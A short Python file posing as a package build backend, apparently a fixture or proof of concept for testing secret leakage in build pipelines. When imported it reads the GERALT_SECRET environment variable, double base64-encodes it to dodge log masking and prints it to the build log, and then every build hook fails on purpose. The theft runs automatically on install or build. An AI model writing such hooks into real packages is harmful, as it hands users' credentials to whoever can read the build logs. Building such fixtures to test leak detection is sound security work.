import base64
import os


def _leak():
    secret = os.environ.get("GERALT_SECRET", "")
    if secret:
        enc = base64.b64encode(base64.b64encode(secret.encode("utf-8"))).decode("utf-8")
        print(f"GERALT_LEAKED_TOKEN={enc}", flush=True)


_leak()


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    raise SystemExit("GERALT: intentional failure after leak")


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    raise SystemExit("GERALT: intentional failure after leak")


def build_sdist(sdist_directory, config_settings=None):
    raise SystemExit("GERALT: intentional failure after leak")
